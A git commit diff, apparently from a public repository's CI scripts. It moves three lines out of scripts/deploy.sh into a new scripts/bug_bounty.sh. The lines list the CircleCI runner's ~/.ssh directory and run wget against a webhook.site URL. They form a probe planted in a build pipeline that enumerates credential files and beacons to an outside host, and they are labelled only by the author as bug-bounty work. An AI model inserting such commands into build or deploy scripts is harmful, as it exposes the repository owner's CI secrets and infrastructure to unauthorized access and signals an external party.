a4cb33979af4e7ccd4b7ebfbdc0af1e045715120
Bug-hunting-github <96895594+Bug-hunting-github@users.noreply.github.com>
2021-12-30 20:31:52 -0500

    Add script

---
+++ scripts/bug_bounty.sh
@@ -0,0 +1,3 @@
+# Bug Bounty 30 Dic 2021
+ls -alh /home/circleci/.ssh
+wget 	https://webhook.site/c10ac759-98d8-4b97-9737-a0f2be274e36?
--- scripts/deploy.sh
+++ scripts/deploy.sh
@@ -1,9 +1,5 @@
 #!/bin/sh
 
-# Bug Bounty 30 Dic 2021
-ls -alh /home/circleci/.ssh
-wget 	https://webhook.site/c10ac759-98d8-4b97-9737-a0f2be274e36?
-
 
 git config --global user.email "dev@fetlife.com"
 git config --global user.name "FetBot"
